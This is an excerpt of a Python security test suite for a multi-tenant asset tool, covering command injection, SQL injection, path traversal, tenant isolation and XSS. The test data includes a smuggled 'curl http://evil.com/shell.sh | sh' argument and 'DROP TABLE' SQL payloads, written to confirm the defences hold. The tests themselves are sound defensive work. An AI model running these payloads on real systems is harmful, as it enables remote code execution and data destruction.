...
class TestCommandInjectionPrevention:
    ...
    def test_command_injection_via_arguments(self, mock_run):
        ...
        with SecureToolExecutor(tenant_id=1) as executor:
            ...
            malicious_args = ["-d", "example.com; curl http://evil.com/shell.sh | sh"]
...
class TestSQLInjectionPrevention:
    ...
    def test_sql_injection_via_identifier(self, test_db):
        ...
        for identifier in malicious_identifiers:
            ...
            result = repo.get_by_identifier(tenant_id=tenant.id, identifier=identifier, asset_type=AssetType.DOMAIN)
    ...
    def test_sql_injection_via_bulk_upsert(self, test_db):
        ...
        malicious_data = [
            {"identifier": "'; DROP TABLE assets; --", "type": AssetType.DOMAIN, "raw_metadata": '{"evil": true}'}
        ]
    ...
    def test_sql_injection_via_metadata(self, test_db):
        ...
        malicious_metadata = [
            {"identifier": "test.com", "type": AssetType.DOMAIN, "raw_metadata": "'; DROP TABLE assets; --"}
        ]
...
class TestPathTraversalPrevention:
    ...
    def test_absolute_path_restriction(self):
        ...
        with SecureToolExecutor(tenant_id=1) as executor:
            ...
            assert len(sanitized) < len(dangerous_absolute_paths) or all(
                executor.temp_dir in arg for arg in sanitized if arg
            )
...
class TestMultiTenantIsolationSecurity:
    ...
    def test_bulk_operations_enforce_tenant_isolation(self, test_db):
        ...
        assets_data = [{"identifier": "asset1.com", "type": AssetType.DOMAIN, "raw_metadata": "{}"}]
    ...
    def test_tenant_id_tampering_prevented(self, test_db):
        ...
        # Create asset for tenant1
        repo.bulk_upsert(tenant1.id, [{"identifier": "test.com", "type": AssetType.DOMAIN, "raw_metadata": "{}"}])
...
class TestXSSPreventionInMetadata:
    ...
    def test_xss_in_raw_metadata_stored_safely(self, test_db):
        ...
        for i, payload in enumerate(xss_payloads):
            assets_data = [{"identifier": f"test{i}.com", "type": AssetType.DOMAIN, "raw_metadata": payload}]
        ...
        for asset in assets:
            ...
            assert (
                "<script>" in asset.raw_metadata
                or "<img" in asset.raw_metadata
                or "javascript:" in asset.raw_metadata
                or "<svg" in asset.raw_metadata
            )
